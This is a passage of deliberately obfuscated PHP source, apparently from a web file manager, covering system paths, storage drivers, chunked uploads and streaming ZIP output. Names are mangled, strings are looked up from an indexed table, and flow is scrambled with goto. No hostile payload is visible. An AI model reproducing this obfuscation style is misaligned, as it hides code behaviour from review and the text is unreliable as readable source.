KodIO::parse($cŸ½²Î‚“”[$dåØ˜³âï[85]]); if (!$b¹È„ãàô´[$dåØ˜³âï[29]]) { $D¾ò†ßÕ = IO::hashSimple($cŸ½²Î‚“”[$dåØ˜³âï[85]]); } } if (!$D¾ò†ßÕ) { $D¾ò†ßÕ = md5($cŸ½²Î‚“”[$dåØ˜³âï[85]] . $cŸ½²Î‚“”[$dåØ˜³âï[87]] . $cŸ½²Î‚“”[$dåØ˜³âï[117]]); } return $D¾ò†ßÕ; } public static function initSystemPath() { $AŒ˜Ìã¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (defined($AŒ˜Ìã¤[1083])) { return; } define($AŒ˜Ìã¤[1083], self::systemPath($AŒ˜Ìã¤[1084])); define($AŒ˜Ìã¤[1085], self::systemPath($AŒ˜Ìã¤[1086])); define($AŒ˜Ìã¤[1087], self::systemPath($AŒ˜Ìã¤[1088])); define($AŒ˜Ìã¤[1089], self::systemPath($AŒ˜Ìã¤[1090])); } private static function systemPath($Eà¼µº“¦) { goto F¾×ìÀÔÉÜ; cºÛˆ«¤†¤: if ($E¹‰³ Õê®) { return $E¹‰³ Õê®; } if ($Eà¼µº“¦ == $c™º›ƒ[1084]) { $E¹‰³ Õê® = self::make(Model($c™º›ƒ[766])->systemRootPathAdd($c™º›ƒ[1093])); } else { $E¹‰³ Õê® = self::systemPath($c™º›ƒ[1084]); $dŞ„±¹˜Üš = self::sourceID($E¹‰³ Õê®); $E¹‰³ Õê® = self::make(Model($c™º›ƒ[766])->mkdir($dŞ„±¹˜Üš, $Eà¼µº“¦)); } Model($c™º›ƒ[1092])->set($eĞ„½Ïˆ»š, $E¹‰³ Õê®); goto DŠ“Ö¤“ñ²; DŠ“Ö¤“ñ²: return $E¹‰³ Õê®; goto aĞ–è¤ò›; F¾×ìÀÔÉÜ: $c™º›ƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eĞ„½Ïˆ»š = $c™º›ƒ[1091] . ucfirst($Eà¼µº“¦); $E¹‰³ Õê® = Model($c™º›ƒ[1092])->get($eĞ„½Ïˆ»š); goto cºÛˆ«¤†¤; aĞ–è¤ò›: } public static function systemFolder($E¥¸Ë‚Ñ) { $E˜™…Æ È¸ = IO_PATH_SYSTEM_SOURCE . $E¥¸Ë‚Ñ; $bÜº’Ğ¡Áì = Cache::get($E˜™…Æ È¸); if (!$bÜº’Ğ¡Áì) { $e§’©¼¶Ó = IO::infoFull($E˜™…Æ È¸); if (!$e§’©¼¶Ó) { $bÜº’Ğ¡Áì = IO::mkdir($E˜™…Æ È¸, REPEAT_SKIP); } else { $bÜº’Ğ¡Áì = $e§’©¼¶Ó[$_SERVER[¶ªÕß‚ØÁŸ][85]]; } Cache::set($E˜™…Æ È¸, $bÜº’Ğ¡Áì, 3600 * 10); } return $bÜº’Ğ¡Áì; } public static function defaultDriver() { return Model($_SERVER[¶ªÕß‚ØÁŸ][717])->defaultDriver(); } public static function defaultIO() { $FĞ’ƒñ‡Çê =& $_SERVER[¶ªÕß‚ØÁŸ]; $dí¤Ç»¹Ô‹ = self::defaultDriver(); return $FĞ’ƒñ‡Çê[1094] . $dí¤Ç»¹Ô‹[$FĞ’ƒñ‡Çê[375]] . $FĞ’ƒñ‡Çê[1081]; } public static function defaultDriverInit() { static $DäÄøĞîöĞ = false; if ($DäÄøĞîöĞ) { return $DäÄøĞîöĞ; } $DäÄøĞîöĞ = IO::init(self::defaultIO()); return $DäÄøĞîöĞ; } public static function fileTypeList() { $EÌ¢‰˜Ìñ‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E¤…­Ç…ë = $GLOBALS[$EÌ¢‰˜Ìñ‡[6]][$EÌ¢‰˜Ìñ‡[1095]]; foreach ($E¤…­Ç…ë as $d¿›°Ö›„æ => $DÊ´£¦õ) { $bˆÒİ à£ = $EÌ¢‰˜Ìñ‡[1096] . $d¿›°Ö›„æ; $fÈ«åÙ˜£ã = LNG($bˆÒİ à£); if ($bˆÒİ à£ != $fÈ«åÙ˜£ã) { $E¤…­Ç…ë[$d¿›°Ö›„æ][$EÌ¢‰˜Ìñ‡[28]] = $fÈ«åÙ˜£ã; } } return $E¤…­Ç…ë; } public static function transferType($c¹¼Š£µ•ê, $Cˆ¢Šãì°Ï) { goto CĞØ¶¢À‘Ü; f¢ÖÇ„: if ($DË¿”¤‡øÁ[$d¶±“ÍÏ„Û[29]] == $Bä¬¡Îí[$d¶±“ÍÏ„Û[29]] && $DË¿”¤‡øÁ[$d¶±“ÍÏ„Û[1097]] == $Bä¬¡Îí[$d¶±“ÍÏ„Û[1097]]) { return $d¶±“ÍÏ„Û[1098]; } if ($DË¿”¤‡øÁ[$d¶±“ÍÏ„Û[29]] == $d¶±“ÍÏ„Û[792] && $Bä¬¡Îí[$d¶±“ÍÏ„Û[29]] == $d¶±“ÍÏ„Û[112]) { return $d¶±“ÍÏ„Û[1044]; } if ($DË¿”¤‡øÁ[$d¶±“ÍÏ„Û[29]] == $d¶±“ÍÏ„Û[112] && $Bä¬¡Îí[$d¶±“ÍÏ„Û[29]] == $d¶±“ÍÏ„Û[792]) { return $d¶±“ÍÏ„Û[113]; } goto bÕ™Ë­Ë¬–; bÕ™Ë­Ë¬–: return $d¶±“ÍÏ„Û[1099]; goto FœùìÆØâ; CĞØ¶¢À‘Ü: $d¶±“ÍÏ„Û =& $_SERVER[¶ªÕß‚ØÁŸ]; $DË¿”¤‡øÁ = self::driverType($c¹¼Š£µ•ê); $Bä¬¡Îí = self::driverType($Cˆ¢Šãì°Ï); goto f¢ÖÇ„; FœùìÆØâ: } public static function driverType($A»¢‡Œİ„¼) { goto A‰Ÿ³Ş²Œ; BŞ”é¹µÅ: return array($D Òğ¡ŒÕø[29] => $D Òğ¡ŒÕø[792], $D Òğ¡ŒÕø[1097] => $A»¢‡Œİ„¼->pathDriver, $D Òğ¡ŒÕø[85] => $fŠÈ–‹ŠŞ); goto A¸‘Ø…¥’ø; Dô¥İÖ­©·: if ($bÚéñ‰¢í == $D Òğ¡ŒÕø[707] || $bÚéñ‰¢í == $D Òğ¡ŒÕø[1101] || $bÚéñ‰¢í == $D Òğ¡ŒÕø[1102]) { $A»¢‡Œİ„¼ = self::defaultDriverInit(); } else { if ($bÚéñ‰¢í == $D Òğ¡ŒÕø[1052] || $bÚéñ‰¢í == $D Òğ¡ŒÕø[1103]) { $A»¢‡Œİ„¼ = IO::init($A»¢‡Œİ„¼->pathParse[$D Òğ¡ŒÕø[1002]]); } } $bÚéñ‰¢í = str_replace($D Òğ¡ŒÕø[1100], $D Òğ¡ŒÕø[33], strtolower($A»¢‡Œİ„¼->getType())); if ($bÚéñ‰¢í == $D Òğ¡ŒÕø[112]) { return array($D Òğ¡ŒÕø[29] => $D Òğ¡ŒÕø[112], $D Òğ¡ŒÕø[1097] => $D Òğ¡ŒÕø[33], $D Òğ¡ŒÕø[85] => $fŠÈ–‹ŠŞ); } goto BŞ”é¹µÅ; A‰Ÿ³Ş²Œ: $D Òğ¡ŒÕø =& $_SERVER[¶ªÕß‚ØÁŸ]; $fŠÈ–‹ŠŞ = $A»¢‡Œİ„¼->path; $bÚéñ‰¢í = str_replace($D Òğ¡ŒÕø[1100], $D Òğ¡ŒÕø[33], strtolower($A»¢‡Œİ„¼->getType())); goto Dô¥İÖ­©·; A¸‘Ø…¥’ø: } } goto c¶Şˆ÷ Ó—; Bö™ˆæÎİ: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto eË­¤œ‡¬è; F¸ƒÂ²Ìªš: $this->checkSize(); $this->tempPathInit(); goto BâôñÁà ; eË­¤œ‡¬è: $fÛ½ÜÇ»åé =& $_SERVER[¶ªÕß‚ØÁŸ]; global $in; $this->in =& $in; goto FëáÙ«ÏÜà; FëáÙ«ÏÜà: if (!empty($_FILES)) { $eŠ›ª¸¿å = $_FILES[$fÛ½ÜÇ»åé[177]]; $this->uploadFile = $eŠ›ª¸¿å[$fÛ½ÜÇ»åé[1970]]; if (!$this->uploadFile && $eŠ›ª¸¿å[$fÛ½ÜÇ»åé[1222]] > 0) { show_json($this->errorInfo($eŠ›ª¸¿å[$fÛ½ÜÇ»åé[1222]]), !1); } } else { if (isset($in[$fÛ½ÜÇ»åé[394]])) { $this->uploadFile = isset($in[$fÛ½ÜÇ»åé[1971]]) ? $fÛ½ÜÇ»åé[1972] : $fÛ½ÜÇ»åé[1817]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto F¸ƒÂ²Ìªš; BâôñÁà : } public function upload() { goto B ÌƒùåÃ; E«­¦ó†‚: CacheLock::unlock($this->tempFile); return $this->tempFile; goto d¬›ÚìîÅ©; bíçòóÁ Ì: $aî¹¨¬–ÎŒ[$bô×ëé¨[1983]][$bô×ëé¨[1984] . $f†¦Ÿœ©] = array($bô×ëé¨[1985] => $d‚ˆÖ²ï³, $bô×ëé¨[1040] => $f†¦Ÿœ©, $bô×ëé¨[87] => $aÌ‰Àéà‹Î, $bô×ëé¨[174] => $cë÷‹ğÉÍ£); $this->statusSet($aî¹¨¬–ÎŒ); if (count($aî¹¨¬–ÎŒ[$bô×ëé¨[1983]]) != $aî¹¨¬–ÎŒ[$bô×ëé¨[1982]]) { $this->showJson($bô×ëé¨[1986] . $f†¦Ÿœ©, !0); } goto C…ÌˆÅ²ÄÓ; d‚ŠÁËİ×: $FÔŞ¸Å„³ = $this->writeTo($EğÆ„Îìï, $a‡‘ò°‡, $this->tempFile); $cë÷‹ğÉÍ£ = IO::hashSimple($EğÆ„Îìï); $aÌ‰Àéà‹Î = IO::size($EğÆ„Îìï); goto Aæ—Ì©‰ŠÆ; Aæ—Ì©‰ŠÆ: @unlink($EğÆ„Îìï); if (!$FÔŞ¸Å„³) { $this->showJson($bô×ëé¨[1981] . $f†¦Ÿœ©, !1); } $aî¹¨¬–ÎŒ[$bô×ëé¨[1982]] = $A×¥Öâ˜àó; goto bíçòóÁ Ì; C…ÌˆÅ²ÄÓ: ignore_timeout(); if (!$this->checkChunkHash($aî¹¨¬–ÎŒ)) { $this->showJson($bô×ëé¨[1987], !1); } $this->statusSet(!1); goto E«­¦ó†‚; B’îëê²íÑ: $bÚ‘ÄÕ£©À = $this->tempFile . $bô×ëé¨[1975] . $f†¦Ÿœ©; $aÌ‰Àéà‹Î = isset($this->in[$bô×ëé¨[528]]) ? intval($this->in[$bô×ëé¨[528]]) : 0; $Bà»šù”ŸÄ = isset($this->in[$bô×ëé¨[1976]]) ? intval($this->in[$bô×ëé¨[1976]]) : 0; goto C“Óæ’ïÖ¿; CÓ‚ãÔˆ…à: CacheLock::lock($this->tempFile, 20); $aî¹¨¬–ÎŒ = $this->statusGet(); $this->initFileTemp(); goto c…®ÒÔÈ±„; B ÌƒùåÃ: $bô×ëé¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f†¦Ÿœ© = isset($this->in[$bô×ëé¨[1973]]) ? intval($this->in[$bô×ëé¨[1973]]) : 0; $A×¥Öâ˜àó = isset($this->in[$bô×ëé¨[1974]]) ? intval($this->in[$bô×ëé¨[1974]]) : 1; goto B’îëê²íÑ; C“Óæ’ïÖ¿: if ($A×¥Öâ˜àó > 1 && $Bà»šù”ŸÄ <= 0) { show_json($bô×ëé¨[1977], !1); } if ($Bà»šù”ŸÄ > $aÌ‰Àéà‹Î) { $A×¥Öâ˜àó = 1; } if ($A×¥Öâ˜àó <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto CÓ‚ãÔˆ…à; c…®ÒÔÈ±„: $EğÆ„Îìï = $this->moveUploadedFile($bÚ‘ÄÕ£©À); if ($aÌ‰Àéà‹Î > 0 && filesize($EğÆ„Îìï) == 0) { $this->showJson($bô×ëé¨[1978], !1); } if (!$EğÆ„Îìï) { $this->showJson(LNG($bô×ëé¨[1979]), !1); } goto D—íŸ± ; D—íŸ± : $d‚ˆÖ²ï³ = $f†¦Ÿœ© * $Bà»šù”ŸÄ; $a‡‘ò°‡ = @fopen($this->tempFile, $bô×ëé¨[1980]); fseek($a‡‘ò°‡, $d‚ˆÖ²ï³); goto d‚ŠÁËİ×; d¬›ÚìîÅ©: } private function checkSize() { $BÔÖêÑË¤™ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (phpBuild64() || $this->in[$BÔÖêÑË¤™[87]] < PHP_INT_MAX) { return; } show_json(LNG($BÔÖêÑË¤™[1988]), !1); } private function showJson($DÄíæ”‰Š‡, $F‡¸„ŠÓã‡) { CacheLock::unlock($this->tempFile); if (!$F‡¸„ŠÓã‡) { return show_json($DÄíæ”‰Š‡, $F‡¸„ŠÓã‡); } show_json($DÄíæ”‰Š‡, $F‡¸„ŠÓã‡); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto BææíõîÓê; BææíõîÓê: $bÜëÁ×ù°Î =& $_SERVER[¶ªÕß‚ØÁŸ]; $bîİÈà†²„ = TEMP_FILES; @mk_dir($bîİÈà†²„); goto aëˆ´¾¨—Ç; aëˆ´¾¨—Ç: touch($bîİÈà†²„ . $bÜëÁ×ù°Î[1989]); $Fï§±×³Á— = isset($this->in[$bÜëÁ×ù°Î[1990]]) ? $this->in[$bÜëÁ×ù°Î[1990]] : !1; if (strlen($Fï§±×³Á—) < 30) { $Fï§±×³Á— = md5(USER_ID . $this->in[$bÜëÁ×ù°Î[85]] . $this->fileName . $this->in[$bÜëÁ×ù°Î[87]]); } goto aŞ¢´ñÕ´; aŞ¢´ñÕ´: $this->tempFile = $bîİÈà†²„ . $bÜëÁ×ù°Î[1991] . md5($Fï§±×³Á— . $this->in[$bÜëÁ×ù°Î[1535]]); goto BÄ´†–½ŞÓ; BÄ´†–½ŞÓ: } private function moveUploadedFile($aÉ§¢¸î¦•) { $b³ŠÖ¼Š± =& $_SERVER[¶ªÕß‚ØÁŸ]; $BÓ¾·Áñ¬‘ = $this->uploadFile; if ($BÓ¾·Áñ¬‘ == $b³ŠÖ¼Š±[1992]) { @file_put_contents($aÉ§¢¸î¦•, base64_decode($_REQUEST[$b³ŠÖ¼Š±[1993]])); } else { if ($BÓ¾·Áñ¬‘ == $b³ŠÖ¼Š±[1817]) { $A³Ğ›ÄÇŠ = @fopen($aÉ§¢¸î¦•, $b³ŠÖ¼Š±[1525]); $this->writeTo($BÓ¾·Áñ¬‘, $A³Ğ›ÄÇŠ, $aÉ§¢¸î¦•); } else { if (!move_uploaded_file($BÓ¾·Áñ¬‘, $aÉ§¢¸î¦•)) { return !1; } } } return $aÉ§¢¸î¦•; } private function writeTo($BÖ£À¢²††, $c‚ßêäÒÓÁ, $Eˆ¦¦òĞñÕ) { goto D„ÉäÎ‚îª; b“·˜ÒÛ‘Ã: fclose($e—ò¿î¢); fclose($c‚ßêäÒÓÁ); CacheLock::unlock($EŠŞÎä«Ùé); goto BØÂáêÃß–; Eä°ô„ï‡ë: $e—ò¿î¢ = @fopen($BÖ£À¢²††, $e¸©†Î“°[1524]); if (!$e—ò¿î¢ || !$c‚ßêäÒÓÁ || !$DïíÑïåÌ¥) { CacheLock::unlock($EŠŞÎä«Ùé); return !1; } while (!feof($e—ò¿î¢)) { fwrite($c‚ßêäÒÓÁ, fread($e—ò¿î¢, 1024 * 200)); } goto b“·˜ÒÛ‘Ã; D„ÉäÎ‚îª: $e¸©†Î“° =& $_SERVER[¶ªÕß‚ØÁŸ]; $EŠŞÎä«Ùé = $e¸©†Î“°[1994] . $Eˆ¦¦òĞñÕ; $DïíÑïåÌ¥ = CacheLock::lock($EŠŞÎä«Ùé, 1); goto Eä°ô„ï‡ë; BØÂáêÃß–: return !0; goto d°öŞĞÏŒ; d°öŞĞÏŒ: } private function statusGet() { goto e×†å¢„ñ; E›’®ß…ùô: $dÌó›œÉô = !1; if (file_exists($fî†ŒËàé¡)) { $dÌó›œÉô = @file_get_contents($fî†ŒËàé¡); } if ($dÌó›œÉô) { $this->statusData = json_decode($dÌó›œÉô, !0); } goto bÉŒ˜›”³±; bÉŒ˜›”³±: if (!$this->statusData) { $E¢´¸Úôİ¢ = array($E¢¯„»µ™ì[28] => $this->fileName, $E¢¯„»µ™ì[1982] => 0, $E¢¯„»µ™ì[1983] => array()); $this->statusSet($E¢´¸Úôİ¢); } return $this->statusData; goto b‰Œ¼†¬; e×†å¢„ñ: $E¢¯„»µ™ì =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_array($this->statusData)) { return $this->statusData; } $fî†ŒËàé¡ = $this->tempFile . $E¢¯„»µ™ì[1995]; goto E›’®ß…ùô; b‰Œ¼†¬: } public function statusSet($B¹éÌø¿‰) { $FÅËë‹Ñ’ù = $this->tempFile . $_SERVER[¶ªÕß‚ØÁŸ][1995]; if (!$B¹éÌø¿‰) { if (file_exists($FÅËë‹Ñ’ù)) { @unlink($FÅËë‹Ñ’ù); } return !0; } $this->statusData = $B¹éÌø¿‰; return file_put_contents($FÅËë‹Ñ’ù, json_encode($B¹éÌø¿‰)); } private function initFileTemp() { $Aç•„Â®Šå =& $_SERVER[¶ªÕß‚ØÁŸ]; if (file_exists($this->tempFile)) { return; } $eÊá£Æ„¢Ë = fopen($this->tempFile, $Aç•„Â®Šå[1996]); fseek($eÊá£Æ„¢Ë, $this->in[$Aç•„Â®Šå[87]] - 1, SEEK_SET); fwrite($eÊá£Æ„¢Ë, $Aç•„Â®Šå[476]); fclose($eÊá£Æ„¢Ë); } public function checkChunk() { goto AŠê¾Äƒ“ƒ; AŠê¾Äƒ“ƒ: $F¾™†æ’¹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BéÆÉ†«–Â = array(); CacheLock::lock($this->tempFile); goto Eß¥™İ×î; Eß¥™İ×î: $A›«ÒĞ‡©ƒ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($A›«ÒĞ‡©ƒ[$F¾™†æ’¹[1983]] as $c®—ÃŸëÓ) { $b—²¾‰ø¬œ = $c®—ÃŸëÓ[$F¾™†æ’¹[174]]; if ($b—²¾‰ø¬œ) { $BéÆÉ†«–Â[$F¾™†æ’¹[1997] . $c®—ÃŸëÓ[$F¾™†æ’¹[1040]]] = $b—²¾‰ø¬œ; } } goto B¿™„–æ; B¿™„–æ: return $BéÆÉ†«–Â; goto C‹ËÌùÖ; C‹ËÌùÖ: } private function checkChunkHash($DÁ½‹Äñ©Ë) { goto c‘òŠªË˜; EŒñ¹£•Ë: $Dç°Ø²—ÖÙ = _get($this->in, $BÍÓ‡²¹¯Ì[1998]); if (strlen($Dç°Ø²—ÖÙ) == 32 && IO::hashSimple($this->tempFile) == $bëÖÅˆ½Ó× && IO::hashMd5($this->tempFile) == $Dç°Ø²—ÖÙ) { return !0; } $aİ±·ê ï = fopen($this->tempFile, $BÍÓ‡²¹¯Ì[1173]); goto Cïâóƒˆ; c‘òŠªË˜: $BÍÓ‡²¹¯Ì =& $_SERVER[¶ªÕß‚ØÁŸ]; if (count($DÁ½‹Äñ©Ë[$BÍÓ‡²¹¯Ì[1983]]) != $DÁ½‹Äñ©Ë[$BÍÓ‡²¹¯Ì[1982]]) { return !1; } $bëÖÅˆ½Ó× = _get($this->in, $BÍÓ‡²¹¯Ì[1990]); goto EŒñ¹£•Ë; F´í¡ìÀ¬Ô: return $CÍÜ‡èÀ; goto a–Œƒšµ; Cïâóƒˆ: $CÍÜ‡èÀ = !0; foreach ($DÁ½‹Äñ©Ë[$BÍÓ‡²¹¯Ì[1983]] as $EôôÛ·êğœ) { fseek($aİ±·ê ï, $EôôÛ·êğœ[$BÍÓ‡²¹¯Ì[1985]]); $CŠô‘àæµÈ = PathDriverStream::hash($aİ±·ê ï, $EôôÛ·êğœ[$BÍÓ‡²¹¯Ì[87]]); if ($EôôÛ·êğœ[$BÍÓ‡²¹¯Ì[174]] != $CŠô‘àæµÈ) { $CÍÜ‡èÀ = !1; break; } } fclose($aİ±·ê ï); goto F´í¡ìÀ¬Ô; a–Œƒšµ: } public static function fileName() { goto d…ÚŒœº§‡; EÆ¾µ–£™: $fÅ‹¡ÌÅÏ¤ = $fÅ‹¡ÌÅÏ¤ ? $fÅ‹¡ÌÅÏ¤ : time(); $cŸ„•Êù¾ = strtolower($AŠ§øõ„ÂÇ); if ($cŸ„•Êù¾ == $b©í‘Õ‡£Á[2000] || $cŸ„•Êù¾ == $b©í‘Õ‡£Á[2001]) { $AŠ§øõ„ÂÇ = date($b©í‘Õ‡£Á[703], $fÅ‹¡ÌÅÏ¤) . $b©í‘Õ‡£Á[80] . $in[$b©í‘Õ‡£Á[87]] . $b©í‘Õ‡£Á[1632]; } else { if ($cŸ„•Êù¾ == $b©í‘Õ‡£Á[2002]) { $AŠ§øõ„ÂÇ = date($b©í‘Õ‡£Á[703], $fÅ‹¡ÌÅÏ¤) . $b©í‘Õ‡£Á[80] . $in[$b©í‘Õ‡£Á[87]] . $b©í‘Õ‡£Á[2003]; } } goto Dôò¯¯ğß‚; Dƒ„¹ƒä‚: if (!empty($_FILES)) { $AŠ§øõ„ÂÇ = $AŠ§øõ„ÂÇ ? $AŠ§øõ„ÂÇ : $_FILES[$b©í‘Õ‡£Á[177]][$b©í‘Õ‡£Á[394]]; } if (!is_wap()) { return KodIO::clear($AŠ§øõ„ÂÇ); } $fÅ‹¡ÌÅÏ¤ = strtotime($in[$b©í‘Õ‡£Á[1999]]); goto EÆ¾µ–£™; d…ÚŒœº§‡: $b©í‘Õ‡£Á =& $_SERVER[¶ªÕß‚ØÁŸ]; global $in; $AŠ§øõ„ÂÇ = isset($in[$b©í‘Õ‡£Á[28]]) ? $in[$b©í‘Õ‡£Á[28]] : $b©í‘Õ‡£Á[33]; goto Dƒ„¹ƒä‚; Dôò¯¯ğß‚: return KodIO::clear($AŠ§øõ„ÂÇ); goto aÍÆŞØÒ; aÍÆŞØÒ: } private function errorInfo($DÒ‚ƒôÈ‘Â) { $d®µÇéÜË =& $_SERVER[¶ªÕß‚ØÁŸ]; $D©¸„Í¸¯ = array($d®µÇéÜË[2004], $d®µÇéÜË[2005], $d®µÇéÜË[2006], $d®µÇéÜË[2007], $d®µÇéÜË[2008], $d®µÇéÜË[2009], $d®µÇéÜË[2010], $d®µÇéÜË[2011]); return $DÒ‚ƒôÈ‘Â . $d®µÇéÜË[4] . $D©¸„Í¸¯[$DÒ‚ƒôÈ‘Â]; } } class ZipMake { const VERSION = "\x30\56\62\56\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($c®ùò¯“Šì = null) { $bì‹Üª‘‘‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->outputStream = fopen($bì‹Üª‘‘‰[2012], $bì‹Üª‘‘‰[1229]); $this->outputName = $c®ùò¯“Šì; $this->needHeaders = !0; } public function addFile($FÓÊ÷šÌ, $fØ·¢‡è§„) { goto fƒåÕÌôÇŠ; c—ÒÈ‚¤¶: $this->addFileFooter($FÓÊ÷šÌ, $dÁ×ĞÈ³Š, $EÙå®ÌÙèˆ, $C¥Ä„½è‚†, $d°¿‡ºÌñì, $AÈÃÈ“¹¾«); goto AêÑ©´£¦è; CİáÀ¹Š‹‡: $AÈÃÈ“¹¾« = $this->addFileHeader($FÓÊ÷šÌ, $dÁ×ĞÈ³Š); $C¥Ä„½è‚† = $d°¿‡ºÌñì = filesize($fØ·¢‡è§„); $eæÇïÏèæ = fopen($fØ·¢‡è§„, $Céßâ®ó[2013]); goto b×Å‚¡· ¤; fƒåÕÌôÇŠ: $Céßâ®ó =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÓÊ÷šÌ = $this->filterFilename($FÓÊ÷šÌ); $dÁ×ĞÈ³Š = static::METHOD_STORE; goto CİáÀ¹Š‹‡; b×Å‚¡· ¤: while (!feof($eæÇïÏèæ)) { $aìÎŞÊ·ßø = fread($eæÇïÏèæ, 1048576); $this->send($aìÎŞÊ·ßø); } fclose($eæÇïÏèæ); $EÙå®ÌÙèˆ = hexdec(hash_file($Céßâ®ó[2014], $fØ·¢‡è§„)); goto c—ÒÈ‚¤¶; AêÑ©´£¦è: } public function addFileFromStream($A†ò·™²‡‘, $Dï÷Ç¢¢…å) { goto eíªÊÇùÙ“; a‡ê‚‘Ûõî: $A›Õ˜ŞñØŠ = hash_init($_SERVER[¶ªÕß‚ØÁŸ][2014]); while (!feof($Dï÷Ç¢¢…å)) { $AÏÇß¹´ß = fread($Dï÷Ç¢¢…å, 1048576); hash_update($A›Õ˜ŞñØŠ, $AÏÇß¹´ß); $this->send($AÏÇß¹´ß); } $A×ñ†Ö¦ëÇ = hexdec(hash_final($A›Õ˜ŞñØŠ)); goto AÇ´ŸŞ§–š; AÇ´ŸŞ§–š: $this->addFileFooter($A†ò·™²‡‘, $a°……Æ·íÀ, $A×ñ†Ö¦ëÇ, $cšê §¶µ¦, $CñÌø‡ç„, $eÀÖÍ‘—Ş£); goto CğœÒ¾æÀ¬; E³ó‘Šà²Õ: fseek($Dï÷Ç¢¢…å, 0, SEEK_END); $cšê §¶µ¦ = $CñÌø‡ç„ = ftell($Dï÷Ç¢¢…å); rewind($Dï÷Ç¢¢…å); goto a‡ê‚‘Ûõî; eíªÊÇùÙ“: $A†ò·™²‡‘ = $this->filterFilename($A†ò·™²‡‘); $a°……Æ·íÀ = static::METHOD_STORE; $eÀÖÍ‘—Ş£ = $this->addFileHeader($A†ò·™²‡‘, $a°……Æ·íÀ); goto E³ó‘Šà²Õ; CğœÒ¾æÀ¬: } public function finish() { foreach ($this->files as $dÉñÓ¶÷äó) { $this->addCdrFile($dÉñÓ¶÷äó); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($CÈùÖ¹Àó, $E™¤Ñ‹ªÃà) { goto D¹‚ñÑ»§‘; D¹‚ñÑ»§‘: $C‘‡’¥«Ë¿ =& $_SERVER[¶ªÕß‚ØÁŸ]; $CÈùÖ¹Àó = preg_replace($C‘‡’¥«Ë¿[2015], $C‘‡’¥«Ë¿[33], $CÈùÖ¹Àó); $FÅ¤¨ÔÔÛ‰ = strlen($CÈùÖ¹Àó); goto d©ÙçùÒ¨›; FÙß„Œ»ã: $aí¯¼ÄŒ“Ä = $this->packFields($B„»é¯Á„–); $D”¡»¯Œ¡Å = $this->packFields($E³Ğ—ä…ğ‹); $this->send($aí¯¼ÄŒ“Ä . $CÈùÖ¹Àó . $D”¡»¯Œ¡Å); goto e”„‰‰‚â†; d©ÙçùÒ¨›: $dÙ£Ãê‚ä… = $this->dosTime(time()); $B„»é¯Á„– = array(array($C‘‡’¥«Ë¿[2016], static::FILE_HEADER_SIGNATURE), array($C‘‡’¥«Ë¿[2017], static::ZIP_VERSION_64), array($C‘‡’¥«Ë¿[2017], 8), array($C‘‡’¥«Ë¿[2017], $E™¤Ñ‹ªÃà), array($C‘‡’¥«Ë¿[2016], $dÙ£Ãê‚ä…), array($C‘‡’¥«Ë¿[2016], 0), array($C‘‡’¥«Ë¿[2016], 4294967295), array($C‘‡’¥«Ë¿[2016], 4294967295), array($C‘‡’¥«Ë¿[2017], $FÅ¤¨ÔÔÛ‰), array($C‘‡’¥«Ë¿[2017], 32)); $E³Ğ—ä…ğ‹ = array(array($C‘‡’¥«Ë¿[2017], 1), array($C‘‡’¥«Ë¿[2017], 28), array($C‘‡’¥«Ë¿[2018], 0), array($C‘‡’¥«Ë¿[2018], 0), array($C‘‡’¥«Ë¿[2018], 0), array($C‘‡’¥«Ë¿[2016], 0)); goto FÙß„Œ»ã; e”„‰‰‚â†: return strlen($aí¯¼ÄŒ“Ä) + $FÅ¤¨ÔÔÛ‰ + strlen($D”¡»¯Œ¡Å); goto A—Ç¥›±¸; A—Ç¥›±¸: } protected function addFileFooter($AøõÕÑÍÌë, $eëôö¥‡ù, $eİ‰º¬Ñë, $cÁ‡¿ê…íî, $D¢æÔµ Ş¯, $eŞ¢¨£—ÃÜ) { $f¢ÑùÃ±ù« =& $_SERVER[¶ªÕß‚ØÁŸ]; $FãÍ„”êœÜ = array(array($f¢ÑùÃ±ù«[2016], static::DATA_DESCRIPTOR_SIGNATURE), array($f¢ÑùÃ±ù«[2016], $eİ‰º¬Ñë), array($f¢ÑùÃ±ù«[2018], $cÁ‡¿ê…íî), array($f¢ÑùÃ±ù«[2018], $D¢æÔµ Ş¯)); $bõê‡‘ÖË„ = $this->packFields($FãÍ„”êœÜ); $this->send($bõê‡‘ÖË„); $e²Ú¼§… = $eŞ¢¨£—ÃÜ + $cÁ‡¿ê…íî + $Bñ‚ôƒòëÀ; $this->addToCdr($AøõÕÑÍÌë, $eëôö¥‡ù, $eİ‰º¬Ñë, $cÁ‡¿ê…íî, $D¢æÔµ Ş¯, $e²Ú¼§…); } private function addToCdr($fÉÕî†Ô„¯, $B†Ã‹Œ‚ëƒ, $A¸µ÷ÕÇô, $a¨Æö‹ßè„, $e¢‚ÄÚˆö«, $Fò‹çÇ¦º¯) { $this->files[] = array($fÉÕî†Ô„¯, $B†Ã‹Œ‚ëƒ, $A¸µ÷ÕÇô, $a¨Æö‹ßè„, $e¢‚ÄÚˆö«, $this->ofs); $this->ofs += $Fò‹çÇ¦º¯; } protected function addCdrFile($FÆß‘Ç‰Â‰) { goto e×ÙÃš§Ç—; e×ÙÃš§Ç—: $Fœ¾°ÎÕá‘ =& 